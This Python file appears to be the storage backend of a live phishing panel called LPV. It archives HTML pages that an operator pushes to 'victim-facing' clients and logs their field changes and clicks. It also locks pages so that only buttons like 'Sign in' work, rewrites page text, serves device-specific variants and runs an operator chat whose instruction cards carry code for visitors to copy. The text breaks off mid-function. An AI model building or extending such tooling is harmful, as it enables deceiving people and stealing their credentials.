"""
LPV (Live Panel Version) storage layer.

Three tables, three jobs:

    lpv_pages
        Archive of HTML pages an admin can push to a client. Stored on
        disk under config.LPV_PAGES_DIR; the DB row points at the file
        and keeps display metadata (name, description, tags, version).

    lpv_sessions
        One row per (client_id, session_started_at). Tracks the *active*
        LPV session for a client so we can show "current page" in the
        admin panel and resume after reconnects.

    lpv_audit
        Append-only event log: page pushes, user events captured by the
        client runtime, admin actions. Indexed by (client_id, timestamp)
        so the admin panel can stream recent events cheaply.

We use SQLite (stdlib) with WAL journaling so writes from the API
process and reads from the admin UI do not block each other.
"""

from __future__ import annotations

import json
import os
import re
import sqlite3
import threading
import time
import uuid
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Tuple

from config import LPV_DB_PATH, LPV_PAGES_DIR


# ---------------------------------------------------------------------------
# Connection management
# ---------------------------------------------------------------------------

_lock = threading.Lock()
_initialized = False


def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(
        LPV_DB_PATH,
        detect_types=sqlite3.PARSE_DECLTYPES,
        isolation_level=None,  # autocommit; we use explicit BEGIN
        check_same_thread=False,
    )
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn


@contextmanager
def get_conn():
    """Thread-safe connection context. One shared connection, serialized
    via a module-level lock — fine for an admin-driven workload. If you
    ever push hundreds of writes/sec through this, switch to a pool."""
    global _initialized
    with _lock:
        if not _initialized:
            init_db()
            _initialized = True
        conn = _connect()
        try:
            yield conn
        finally:
            conn.close()


def init_db() -> None:
    LPV_PAGES_DIR.mkdir(parents=True, exist_ok=True)
    with _connect() as conn:
        conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS lpv_pages (
                id            TEXT PRIMARY KEY,
                name          TEXT NOT NULL,
                description   TEXT NOT NULL DEFAULT '',
                tags          TEXT NOT NULL DEFAULT '[]',   -- JSON array
                file_path     TEXT NOT NULL,
                size_bytes    INTEGER NOT NULL DEFAULT 0,
                version       INTEGER NOT NULL DEFAULT 1,
                created_at    REAL NOT NULL,
                updated_at    REAL NOT NULL
            );

            CREATE INDEX IF NOT EXISTS idx_lpv_pages_name
                ON lpv_pages(name COLLATE NOCASE);
            CREATE INDEX IF NOT EXISTS idx_lpv_pages_updated
                ON lpv_pages(updated_at DESC);

            -- Version history. Every save_page() on an existing page
            -- snapshots the *previous* HTML here before overwriting the
            -- live file, so admins can diff or roll back without git.
            CREATE TABLE IF NOT EXISTS lpv_page_versions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                page_id     TEXT NOT NULL,
                version     INTEGER NOT NULL,
                name        TEXT NOT NULL,
                description TEXT NOT NULL DEFAULT '',
                tags        TEXT NOT NULL DEFAULT '[]',
                file_path   TEXT NOT NULL,
                size_bytes  INTEGER NOT NULL,
                created_at  REAL NOT NULL,
                UNIQUE(page_id, version)
            );
            CREATE INDEX IF NOT EXISTS idx_lpv_versions_page
                ON lpv_page_versions(page_id, version DESC);

            CREATE TABLE IF NOT EXISTS lpv_sessions (
                client_id            TEXT PRIMARY KEY,
                current_page_id      TEXT,
                current_page_name    TEXT,
                lpv_active           INTEGER NOT NULL DEFAULT 0,
                started_at           REAL NOT NULL,
                last_event_at        REAL,
                FOREIGN KEY (current_page_id) REFERENCES lpv_pages(id) ON DELETE SET NULL
            );

            CREATE TABLE IF NOT EXISTS lpv_audit (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id    TEXT NOT NULL,
                event_type   TEXT NOT NULL,    -- e.g. 'page_pushed', 'field_change', 'click', 'page_loaded'
                page_id      TEXT,
                page_name    TEXT,
                payload      TEXT NOT NULL DEFAULT '{}',  -- JSON
                timestamp    REAL NOT NULL
            );

            CREATE INDEX IF NOT EXISTS idx_lpv_audit_client_time
                ON lpv_audit(client_id, timestamp DESC);

            -- Per-client redaction rules. When lpv_event arrives we
            -- look up the matching client_id and replace any value in
            -- a sensitive field with a mask. The raw value never leaves
            -- the client runtime in those cases.
            CREATE TABLE IF NOT EXISTS lpv_redaction (
                client_id    TEXT NOT NULL,
                selector     TEXT NOT NULL,         -- e.g. 'name=pwd' or 'type=password' or '.cc-number'
                field        TEXT NOT NULL,         -- 'name' | 'type' | 'id' | 'placeholder' | 'label' | 'class'
                action       TEXT NOT NULL DEFAULT 'mask',  -- 'mask' | 'hide' (drop the field entirely)
                created_at   REAL NOT NULL,
                PRIMARY KEY (client_id, selector, field)
            );

            -- Workflow: an ordered sequence of pages to push as one
            -- "Push Workflow" action. Each step can be a single page
            -- (push_page) or a wait (sleep_seconds). The admin panel
            -- renders this as a vertical stepper.
            CREATE TABLE IF NOT EXISTS lpv_workflows (
                id            TEXT PRIMARY KEY,
                name          TEXT NOT NULL,
                description   TEXT NOT NULL DEFAULT '',
                steps         TEXT NOT NULL DEFAULT '[]',   -- JSON array of {kind, page_id, sleep_seconds}
                created_at    REAL NOT NULL,
                updated_at    REAL NOT NULL
            );
            """
        )
        # ---- workflow branding + optional redirect-respect (added later) ----
        # Older DBs lack these columns; add them idempotently.
        try:
            existing_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_workflows)").fetchall()
            }
            for col, decl in (
                ("brand_logo_url",   "brand_logo_url TEXT NOT NULL DEFAULT ''"),
                ("brand_color",      "brand_color TEXT NOT NULL DEFAULT ''"),
                ("respect_redirect", "respect_redirect INTEGER NOT NULL DEFAULT 1"),
            ):
                if col not in existing_cols:
                    conn.execute(f"ALTER TABLE lpv_workflows ADD COLUMN {decl}")
        except Exception:
            pass

        # ---- custom redirect / loading page (added later) ----
        # A workflow can replace the built-in LPV spinner with an operator
        # supplied HTML document. Two flavours, resolved in this order:
        #   redirect_html   raw HTML stored directly on the workflow
        #   redirect_page_id  an existing archived LPV page, reused as-is
        # An empty redirect_html with a set redirect_page_id means "render
        # archived page <id>"; both empty means "use the built-in spinner".
        try:
            existing_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_workflows)").fetchall()
            }
            for col, decl in (
                ("redirect_html", "redirect_html TEXT NOT NULL DEFAULT ''"),
                ("redirect_page_id", "redirect_page_id TEXT NOT NULL DEFAULT ''"),
            ):
                if col not in existing_cols:
                    conn.execute(f"ALTER TABLE lpv_workflows ADD COLUMN {decl}")
        except Exception:
            pass

        # ---- page bindings (added later): per-page find->replace rules ----
        # Admin-defined substitutions applied when the page is SERVED to a
        # client (victim-facing), e.g. rewrite every "me.com" to "you.com".
        # Stored as a JSON array of {"find": str, "replace": str}.
        try:
            page_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_pages)").fetchall()
            }
            if "bindings" not in page_cols:
                conn.execute(
                    "ALTER TABLE lpv_pages ADD COLUMN bindings TEXT NOT NULL DEFAULT '[]'"
                )
        except Exception:
            pass

        # ---- click guard (added later): per-page interaction allowlist ----
        # A locked page only lets the operator-approved buttons register
        # (e.g. just "Sign in"); every other click is swallowed so a visitor
        # cannot trip the wrong control. Stored as JSON:
        #   {"enabled": bool, "allow": [rule, ...],
        #    "notify": bool, "feedback": bool}
        # See normalise_guard() for the accepted rule syntax.
        try:
            page_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_pages)").fetchall()
            }
            if "guard" not in page_cols:
                conn.execute(
                    "ALTER TABLE lpv_pages ADD COLUMN guard TEXT NOT NULL DEFAULT '{}'"
                )
        except Exception:
            pass

        # ---- click actions (added later): click -> go somewhere ----
        # A page can map a specific control to somewhere else: "if the
        # visitor clicks this, show that page" or "...open this link".
        # Stored as JSON: [{"match": rule, "do": "page"|"link",
        #                  "page_id": str, "url": str, "new_tab": bool}]
        # `match` uses the same rule syntax as the click guard (see
        # normalise_guard) so an operator only has to learn it once.
        try:
            page_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_pages)").fetchall()
            }
            if "actions" not in page_cols:
                conn.execute(
                    "ALTER TABLE lpv_pages ADD COLUMN actions TEXT NOT NULL DEFAULT '[]'"
                )
        except Exception:
            pass

        # ---- device variants (added later): one workflow, two layouts ----
        # A page can be built for one audience and paired with the version
        # built for the other one:
        #
        #   device           'any' (default) | 'mobile' | 'desktop'
        #   variant_page_id  the page to serve instead when the visitor's
        #                    device does NOT match `device`
        #
        # Workflows then reference the page once; the server resolves it per
        # visitor, so there is no need for a mobile workflow and a desktop
        # workflow. Resolved in resolve_page_for_device() below.
        try:
            page_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_pages)").fetchall()
            }
            for col, decl in (
                ("device", "device TEXT NOT NULL DEFAULT 'any'"),
                ("variant_page_id", "variant_page_id TEXT NOT NULL DEFAULT ''"),
            ):
                if col not in page_cols:
                    conn.execute(f"ALTER TABLE lpv_pages ADD COLUMN {decl}")
        except Exception:
            pass

        # ------------------------------------------------------------------
        # Live chat: operator <-> client conversation on LPV pages
        # ------------------------------------------------------------------
        # Append-only. History is intentionally never pruned so a reconnecting
        # client (and the admin) always see the full thread.
        #
        #   role  'client' | 'admin'   who wrote it
        #   kind  'text' | 'code' | 'instruction'
        #           text        -> plain bubble
        #           code        -> copyable code block
        #           instruction -> highlighted instruction card with optional
        #                          code payload rendered under it
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS lpv_chat (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id   TEXT NOT NULL,
                role        TEXT NOT NULL DEFAULT 'client',
                kind        TEXT NOT NULL DEFAULT 'text',
                body        TEXT NOT NULL DEFAULT '',
                code        TEXT NOT NULL DEFAULT '',
                created_at  REAL NOT NULL
            )
            """
        )
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_lpv_chat_client "
            "ON lpv_chat(client_id, created_at)"
        )

        # ---- stable per-person identity (added later) --------------------
        # client_id is the RUNTIME id: a fresh value per tab/connection. That
        # is right for connection ownership, but it means the same person
        # opening a second tab (or coming back tomorrow) looks like a brand
        # new stranger and their chat thread starts empty.
        #
        # identity_key is the durable per-person key (the client's persisted
        # user id). Chat is grouped by it when present, and falls back to
        # client_id for older rows written before this existed, so existing
        # threads keep working untouched.
        try:
            chat_cols = {
                r[1] for r in conn.execute("PRAGMA table_info(lpv_chat)").fetchall()
            }
            if "identity_key" not in chat_cols:
                conn.execute("ALTER TABLE lpv_chat ADD COLUMN identity_key TEXT")
        except Exception:
            pass
        conn.execute(
            "CREATE INDEX IF NOT EXISTS idx_lpv_chat_identity "
            "ON lpv_chat(identity_key, created_at)"
        )


# ---------------------------------------------------------------------------
# Archive (pages)
# ---------------------------------------------------------------------------

def save_page(
    name: str,
    html: str,
    description: str = "",
    tags: Optional[Iterable[str]] = None,
    page_id: Optional[str] = None,
) -> Dict[str, Any]:
    """Insert or update an archived HTML page. The raw HTML is written
    to disk; the DB row stores metadata + file path so queries stay
    fast and we never bloat sqlite with multi-MB blobs.

    On update, the *previous* version of the page is snapshotted into
    `lpv_page_versions` so the admin can view or roll back later."""
    name = (name or "").strip()
    if not name:
        raise ValueError("page name is required")
    if not name.lower().endswith((".html", ".htm")):
        name = name + ".html"

    tags_list = list(tags or [])
    now = time.time()
    pid = page_id or uuid.uuid4().hex
    safe_filename = f"{pid}.html"
    file_path = LPV_PAGES_DIR / safe_filename

    with get_conn() as conn:
        # Detect existing row by name (case-insensitive) so re-uploading
        # the same name updates instead of duplicating.
        existing = conn.execute(
            "SELECT * FROM lpv_pages WHERE name = ? COLLATE NOCASE",
            (name,),
        ).fetchone()
        if existing:
            pid = existing["id"]
            prev_version = existing["version"]
            new_version = prev_version + 1
            new_file_path = LPV_PAGES_DIR / f"{pid}.html"
            prev_file_path = Path(existing["file_path"])
            prev_html = ""
            if prev_file_path.exists():
                try:
                    prev_html = prev_file_path.read_text(encoding="utf-8", errors="replace")
                except Exception:
                    prev_html = ""

            # Snapshot the previous version BEFORE we overwrite the file.
            # Each version gets its own file so even the live page can be
            # moved around without breaking the history.
            version_file = LPV_PAGES_DIR / f"{pid}.v{prev_version}.html"
            try:
                version_file.write_text(prev_html, encoding="utf-8")
            except Exception:
                version_file = prev_file_path  # fall back to live file

            conn.execute(
                """
                INSERT OR REPLACE INTO lpv_page_versions
                (page_id, version, name, description, tags, file_path, size_bytes, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    pid,
                    prev_version,
                    existing["name"],
                    existing["description"],
                    existing["tags"],
                    str(version_file),
                    existing["size_bytes"],
                    now,
                ),
            )

            # Now write the new content to the live file.
            new_file_path.write_text(html, encoding="utf-8")
            conn.execute(
                """
                UPDATE lpv_pages
                SET description = ?, tags = ?, file_path = ?, size_bytes = ?,
                    version = ?, updated_at = ?
                WHERE id = ?
                """,
                (
                    description,
                    json.dumps(tags_list),
                    str(new_file_path),
                    len(html.encode("utf-8")),
                    new_version,
                    now,
                    pid,
                ),
            )
        else:
            file_path.write_text(html, encoding="utf-8")
            conn.execute(
                """
                INSERT INTO lpv_pages
                (id, name, description, tags, file_path, size_bytes, version, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?)
                """,
                (
                    pid,
                    name,
                    description,
                    json.dumps(tags_list),
                    str(file_path),
                    len(html.encode("utf-8")),
                    now,
                    now,
                ),
            )

    return get_page(pid) or {}


def replace_page_html(page_id: str, html: str, description: Optional[str] = None,
                      tags: Optional[Iterable[str]] = None) -> Optional[Dict[str, Any]]:
    """Re-upload the HTML for an existing archive.

    Everything the operator has set up on the page survives — bindings,
    click guard, click actions, device pairing — because only the file and
    the version counter change. The outgoing HTML is snapshotted into the
    version history first, exactly like a name-based re-upload.
    """
    page = get_page(page_id)
    if not page:
        return None
    if html is None:
        raise ValueError("html is required")
    html = str(html)
    if not html.strip():
        raise ValueError("html is required")

    now = time.time()
    prev_version = int(page.get("version") or 1)
    live_path = LPV_PAGES_DIR / f"{page_id}.html"
    prev_html = ""
    if live_path.exists():
        try:
            prev_html = live_path.read_text(encoding="utf-8", errors="replace")
        except Exception:
            prev_html = ""
    version_file = LPV_PAGES_DIR / f"{page_id}.v{prev_version}.html"
    try:
        version_file.write_text(prev_html, encoding="utf-8")
        version_path = str(version_file)
    except Exception:
        version_path = str(live_path)

    with get_conn() as conn:
        conn.execute(
            """
            INSERT OR REPLACE INTO lpv_page_versions
            (page_id, version, name, description, tags, file_path, size_bytes, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (page_id, prev_version, page["name"], page.get("description", ""),
             json.dumps(page.get("tags") or []), version_path,
             page.get("size_bytes") or 0, now),
        )
        live_path.write_text(html, encoding="utf-8")
        fields = ["file_path = ?", "size_bytes = ?", "version = ?", "updated_at = ?"]
        values: List[Any] = [str(live_path), len(html.encode("utf-8")),
                             prev_version + 1, now]
        if description is not None:
            fields.append("description = ?")
            values.append(str(description))
        if tags is not None:
            fields.append("tags = ?")
            values.append(json.dumps(list(tags)))
        values.append(page_id)
        conn.execute(f"UPDATE lpv_pages SET {', '.join(fields)} WHERE id = ?", values)
    return get_page(page_id)


def rename_page(page_id: str, new_name: str) -> Optional[Dict[str, Any]]:
    """Rename a page. Keeps the same id and version history; only the
    `name` column changes. Fails (returns None) if the new name is
    empty or collides with another page."""
    new_name = (new_name or "").strip()
    if not new_name:
        raise ValueError("new name is required")
    if not new_name.lower().endswith((".html", ".htm")):
        new_name = new_name + ".html"
    with get_conn() as conn:
        collision = conn.execute(
            "SELECT id FROM lpv_pages WHERE name = ? COLLATE NOCASE AND id != ?",
            (new_name, page_id),
        ).fetchone()
        if collision:
            raise ValueError(f"a page named {new_name!r} already exists")
        conn.execute(
            "UPDATE lpv_pages SET name = ?, updated_at = ? WHERE id = ?",
            (new_name, time.time(), page_id),
        )
    return get_page(page_id)


def duplicate_page(page_id: str, new_name: Optional[str] = None) -> Optional[Dict[str, Any]]:
    """Deep-copy a page: new id, new file, fresh version=1, same HTML.
    If new_name is None we suffix ' (copy)'. The new page starts a
    fresh version history."""
    src = get_page(page_id)
    if not src:
        return None
    target_name = (new_name or (src["name"].rsplit(".", 1)[0] + " (copy).html")).strip()
    html = read_page_html(page_id) or ""
    return save_page(
        name=target_name,
        html=html,
        description=src.get("description", ""),
        tags=src.get("tags", []),
    )


def list_versions(page_id: str) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM lpv_page_versions WHERE page_id = ? ORDER BY version DESC",
            (page_id,),
        ).fetchall()
    return [
        {
            "id": r["id"],
            "page_id": r["page_id"],
            "version": r["version"],
            "name": r["name"],
            "description": r["description"],
            "tags": json.loads(r["tags"] or "[]"),
            "file_path": r["file_path"],
            "size_bytes": r["size_bytes"],
            "created_at": r["created_at"],
        }
        for r in rows
    ]


def get_version(page_id: str, version: int) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        r = conn.execute(
            "SELECT * FROM lpv_page_versions WHERE page_id = ? AND version = ?",
            (page_id, version),
        ).fetchone()
    if not r:
        return None
    return {
        "id": r["id"],
        "page_id": r["page_id"],
        "version": r["version"],
        "name": r["name"],
        "description": r["description"],
        "tags": json.loads(r["tags"] or "[]"),
        "file_path": r["file_path"],
        "size_bytes": r["size_bytes"],
        "created_at": r["created_at"],
    }


def read_version_html(page_id: str, version: int) -> Optional[str]:
    v = get_version(page_id, version)
    if not v:
        return None
    p = Path(v["file_path"])
    if not p.exists():
        return None
    return p.read_text(encoding="utf-8", errors="replace")


def restore_version(page_id: str, version: int) -> Optional[Dict[str, Any]]:
    """Roll the live page back to a previous version. Snapshots the
    *current* live state into history first so the restore is itself
    reversible."""
    html = read_version_html(page_id, version)
    if html is None:
        return None
    current = get_page(page_id)
    if not current:
        return None
    # Round-tripping through save_page() correctly snapshots the
    # current state as a new history entry and bumps the version.
    return save_page(
        name=current["name"],
        html=html,
        description=current.get("description", ""),
        tags=current.get("tags", []),
        page_id=page_id,
    )


def list_pages(query: str = "", limit: int = 200) -> List[Dict[str, Any]]:
    with get_conn() as conn:
        if query:
            like = f"%{query}%"
            rows = conn.execute(
                """
                SELECT * FROM lpv_pages
                WHERE name LIKE ? COLLATE NOCASE
                   OR description LIKE ? COLLATE NOCASE
                   OR tags LIKE ? COLLATE NOCASE
                ORDER BY updated_at DESC
                LIMIT ?
                """,
                (like, like, like, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM lpv_pages ORDER BY updated_at DESC LIMIT ?",
                (limit,),
            ).fetchall()
    return [_row_to_page(r) for r in rows]


def get_page(page_id: str) -> Optional[Dict[str, Any]]:
    with get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM lpv_pages WHERE id = ?", (page_id,)
        ).fetchone()
    return _row_to_page(row) if row else None


def read_page_html(page_id: str) -> Optional[str]:
    page = get_page(page_id)
    if not page:
        return None
    path = Path(page["file_path"])
    if not path.exists():
        return None
    return path.read_text(encoding="utf-8", errors="replace")


def delete_page(page_id: str) -> bool:
    page = get_page(page_id)
    if not page:
        return False
    with get_conn() as conn:
        conn.execute("DELETE FROM lpv_pages WHERE id = ?", (page_id,))
    try:
        Path(page["file_path"]).unlink(missing_ok=True)
    except Exception:
        pass
    return True


def _row_to_page(row: sqlite3.Row) -> Dict[str, Any]:
    try:
        tags = json.loads(row["tags"] or "[]")
    except Exception:
        tags = []
    # Bindings carry who/what/where: name (the slot the panel asks for at
    # push time), match kind (text | selector | regex), the matcher itself and
    # the default value. Old rows only had find/replace; those still load and
    # still behave as always, with `replace` mirrored into `value` so older
    # readers (and saved UI state) keep working.
    try:
        from page_bindings import normalise_bindings
        bindings = normalise_bindings(json.loads(row["bindings"] or "[]"))
    except Exception:
        bindings = []
    for binding in bindings:
        binding.setdefault("replace", binding.get("value", ""))
    return {
        "id": row["id"],
        "name": row["name"],
        "description": row["description"],
        "tags": tags,
        "file_path": row["file_path"],
        "size_bytes": row["size_bytes"],
        "version": row["version"],
        "created_at": row["created_at"],
        "updated_at": row["updated_at"],
        "bindings": bindings,
        "guard": normalise_guard(_row_get(row, "guard")),
        "actions": normalise_actions(_row_get(row, "actions")),
        "device": normalise_device(_row_get(row, "device")),
        "variant_page_id": str(_row_get(row, "variant_page_id") or ""),
    }


def _row_get(row: sqlite3.Row, key: str) -> Any:
    """Read an optional column without exploding on a pre-migration row."""
    try:
        return row[key]
    except (IndexError, KeyError):
        return None


# ---------------------------------------------------------------------------
# Device variants — one workflow, a mobile and a desktop layout
# ---------------------------------------------------------------------------
# Each page declares who it is FOR (`device`) and, optionally, which page to
# serve to the other audience (`variant_page_id`):
#
#   mobile page  + variant_page_id = <desktop page>   -> phones see it,
#                                                        desktops see the pair
#   desktop page + variant_page_id = <mobile page>     -> and vice versa
#   any page     (default)                             -> everyone sees it
#
# A workflow only references one of the two pages. The server resolves the
# right one per visitor (see resolve_page_for_device), so one workflow now
# serves phones and desktops instead of two duplicated workflows.
DEVICES = ("any", "mobile", "desktop")


def normalise_device(value: Any) -> str:
    """Coerce anything to one of DEVICES. Unknown -> 'any' (never breaks)."""
    text = str(value or "").strip().lower()
    return text if text in DEVICES else "any"


def _other_device(device: str) -> str:
    return "desktop" if device == "mobile" else "mobile"


def set_page_device(
    page_id: str,
    device: Any,
    variant_page_id: Any = "",
) -> Optional[Dict[str, Any]]:
    """Set which audience a page is for and its counterpart page.

    Keeps the pair symmetric so a workflow referencing EITHER member resolves
    for both: when the counterpart is still unclassified ('any') it takes the
    complementary role, and an empty back-reference is filled in. Explicit
    settings on the counterpart are never overwritten.

    Note: every DB lookup happens before the write transaction — get_conn()
    holds a non-reentrant lock, so nested reads would deadlock.
    """
    page = get_page(page_id)
    if not page:
        return None
    role = normalise_device(device)
    variant_id = str(variant_page_id or "").strip()
    if role == "any":
        variant_id = ""                      # a shared page has no counterpart
    counterpart: Optional[Dict[str, Any]] = None
    if variant_id:
        if variant_id == page_id:
            raise ValueError("a page cannot be its own variant")
        counterpart = get_page(variant_id)
        if not counterpart:
            raise ValueError("variant page not found")

    now = time.time()
    counterpart_updates: List[str] = []
    counterpart_params: List[Any] = []
    if counterpart is not None:
        counterpart_role = normalise_device(counterpart.get("device"))
        if counterpart_role in ("any", role):
            counterpart_role = _other_device(role)
            counterpart_updates.append("device = ?")
            counterpart_params.append(counterpart_role)
        if not str(counterpart.get("variant_page_id") or "") \
                and counterpart_role == _other_device(role):
            counterpart_updates.append("variant_page_id = ?")
            counterpart_params.append(page_id)

    with get_conn() as conn:
        conn.execute(
            "UPDATE lpv_pages SET device = ?, variant_page_id = ?, updated_at = ? WHERE id = ?",
            (role, variant_id, now, page_id),
        )
        if counterpart_updates:
            counterpart_params.append(now)
            counterpart_params.append(variant_id)
            conn.execute(
                f"UPDATE lpv_pages SET {', '.join(counterpart_updates)}, updated_at = ? "
                "WHERE id = ?",
                tuple(counterpart_params),
            )
    return get_page(page_id)


def resolve_page_for_device(
    page_id: str, device: Any
) -> Tuple[Optional[Dict[str, Any]], str]:
    """The page a visitor on ``device`` should actually see.

    Returns ``(page, swapped_from_page_id)``; ``swapped_from_page_id`` is the
    id that was asked for when a variant was substituted, else ``''``.
    Unknown devices ('any') and unclassified pages resolve to themselves, so
    an old client or an unpaired page behaves exactly as before.
    """
    page = get_page(page_id)
    if not page:
        return None, ""
    wanted = normalise_device(device)
    role = normalise_device(page.get("device"))
    if wanted in ("any", "mobile", "desktop"):
        if wanted == "any" or role in ("any", wanted):
            return page, ""
    variant_id = str(page.get("variant_page_id") or "")
    if not variant_id:
        return page, ""                      # unpaired: serve it as-is
    variant = get_page(variant_id)
    if not variant:
        return page, ""                      # counterpart deleted: as-is
    return variant, page_id


# ---------------------------------------------------------------------------
# Click guard — per-page interaction allowlist
# ---------------------------------------------------------------------------
# When a page is locked, client.html swallows every click except the ones the
# operator listed. The allowlist entries are matched against the clicked
# element (and its ancestors):
#
#   *                 everything is allowed (a no-op lock)
#   #signin           element id
#   .js-submit        class name
#   button[type=submit] / a[href*="/login"]   plain CSS selector
#   button            tag name
#   text:Sign in      visible text / aria-label / value contains "Sign in"
#   name:identifier   form field or button name attribute
#   aria:Continue     aria-label contains "Continue"
#
# The same rules are implemented in client.html (guardAllows); keep the two
# in step — tests/test_page_guard.cjs pins the client side.

GUARD_MAX_RULES = 40
GUARD_MAX_RULE_LEN = 200
GUARD_MAX_MESSAGE_LEN = 300

# Shown to the visitor when they press a control the guard blocks. The
# operator can replace it per page (guard["message"]); emptying it falls back
# to this text. Turning guard["feedback"] off shows nothing at all.
DEFAULT_GUARD_MESSAGE = "This control is locked — use the highlighted button"

DEFAULT_GUARD: Dict[str, Any] = {
    "enabled": False,
    "allow": [],
    "notify": True,
    "feedback": True,
    "message": "",
}


def _truthy(value: Any, default: bool = False) -> bool:
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    text = str(value).strip().lower()
    if text in ("1", "true", "yes", "on", "enabled", "lock", "locked"):
        return True
    if text in ("0", "false", "no", "off", "disabled", "unlock", "unlocked", ""):
        return False
    return default


def normalise_guard(raw: Any) -> Dict[str, Any]:
    """Return a well-formed guard dict from anything the DB or an API caller
    supplies. Never raises — an unreadable value means "not locked"."""
    data = raw
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except Exception:
            data = None
    if not isinstance(data, dict):
        return dict(DEFAULT_GUARD, allow=[])

    rules: List[str] = []
    seen = set()
    src = data.get("allow")
    if isinstance(src, str):
        # Tolerate a newline/comma separated blob as well as a JSON array.
        src = [chunk for chunk in re.split(r"[\n,]+", src)]
    if isinstance(src, (list, tuple)):
        for item in src:
            if item is None:
                continue
            rule = str(item).strip()
            if not rule or rule in seen:
                continue
            seen.add(rule)
            rules.append(rule[:GUARD_MAX_RULE_LEN])
            if len(rules) >= GUARD_MAX_RULES:
                break

    # Visitor-facing hint. Rendered with textContent on the client, so it is
    # plain text only; newlines are collapsed and the length is capped.
    message = data.get("message")
    if message is None:
        # Accept the older/aliased keys so a hand-written payload still works.
        message = data.get("hint") if data.get("hint") is not None else data.get("feedback_text")
    message = re.sub(r"\s+", " ", str(message or "")).strip()
    message = message[:GUARD_MAX_MESSAGE_LEN]

    return {
        "enabled": _truthy(data.get("enabled"), False),
        "allow": rules,
        "notify": _truthy(data.get("notify"), True),
        "feedback": _truthy(data.get("feedback"), True),
        "message": message,
    }


def get_page_guard(page_id: str) -> Optional[Dict[str, Any]]:
    page = get_page(page_id)
    if not page:
        return None
    return normalise_guard(page.get("guard"))


def set_page_guard(page_id: str, guard: Any) -> Optional[Dict[str, Any]]:
    """Persist a page's click guard. Returns the stored value, or None when
    the page does not exist."""
    clean = normalise_guard(guard)
    with get_conn() as conn:
        cur = conn.execute(
            "UPDATE lpv_pages SET guard = ?, updated_at = ? WHERE id = ?",
            (json.dumps(clean), time.time(), page_id),
        )
    if cur.rowcount <= 0:
        return None
    return clean


# ---------------------------------------------------------------------------
# Click actions — "if the visitor clicks this, go there"
# ---------------------------------------------------------------------------
# The matcher is exactly a guard rule (see the syntax above): text:Sign in,
# .js-next, button[type=submit], a "plain" CSS selector, name:, aria:.
# The target is either another archived page (served through the normal push
# path, so bindings/guard/device versions all apply) or an external link.
ACTION_MAX_RULES = 20
ACTION_MAX_MATCH = 200
ACTION_MAX_URL = 2048
ACTION_KINDS = ("page", "link")


def normalise_action(raw: Any) -> Optional[Dict[str, Any]]:
    """One click action, or None when it says nothing usable."""
    if not isinstance(raw, dict):
        return None
    match = str(raw.get("match") or raw.get("selector") or "").strip()[:ACTION_MAX_MATCH]
    if not match:
        return None
    do = str(raw.get("do") or raw.get("action") or "page").strip().lower()
    if do in ("url", "goto", "open", "external"):
        do = "link"
    if do in ("flow", "workflow", "push"):
        do = "page"
    if do not in ACTION_KINDS:
        do = "page"
    out: Dict[str, Any] = {"match": match, "do": do}
    if do == "page":
        page_id = str(raw.get("page_id") or "").strip()
        if not page_id:
            return None
        out["page_id"] = page_id[:64]
        out["page_name"] = str(raw.get("page_name") or "")[:200]
    else:
        url = str(raw.get("url") or raw.get("href") or "").strip()[:ACTION_MAX_URL]
        if not url:
            return None
        out["url"] = url
        out["new_tab"] = _truthy(raw.get("new_tab"), False)
    if raw.get("label"):
        out["label"] = str(raw["label"])[:80]
    return out


def normalise_actions(raw: Any) -> List[Dict[str, Any]]:
    """Load a page's action list from the DB / an API caller. Never raises."""
    data = raw
    if isinstance(data, str):
        try:
            data = json.loads(data or "[]")
        except Exception:
            return []
    if isinstance(data, dict):
        data = [data]
    if not isinstance(data, (list, tuple)):
        return []
    out: List[Dict[str, Any]] = []
    for item in data:
        action = normalise_action(item)
        if action:
            out.append(action)
        if len(out) >= ACTION_MAX_RULES:
            break
    return out


def set_page_actions(page_id: str, actions: Any) -> Optional[List[Dict[str, Any]]]:
    """Persist a page's click actions. Returns the stored list or None."""
    clean = normalise_actions(actions)
    with get_conn() as conn:
        cur = conn.execute(
            "UPDATE lpv_pages SET actions = ?, updated_at = ? WHERE id = ?",
            (json.dumps(clean), time.time(), page_id),
        )
    if cur.rowcount <= 0:
        return None
    return clean


def get_page_actions(page_id: str) -> List[Dict[str, Any]]:
    page = get_page(page_id)
    return normalise_actions(page.get("actions")) if page else []


def clients_on_page(page_id: str) -> List[str]:
    """Every client session currently showing this page — used to push a
    live guard change without waiting for the next page push."""
    if not page_id:
        return []
    try:
        with get_conn() as conn:
            rows = conn.execute(
                "SELECT client_id FROM lpv_sessions WHERE current_page_id = ?",
                (page_id,),
            ).fetchall()
    except Exception:
        return []
    return [r["client_id"] for r in rows]


def set_page_bindings(page_id: str, bindings: Any) -> bool:
    """Replace a page's binding list.

    Each binding may name a slot the operator fills at push time, and picks
    how to find it: literal text, a CSS selector, or a regex. Validation lives
    in page_bindings.normalise_bindings (max 50 rules, 2000 chars per matcher);
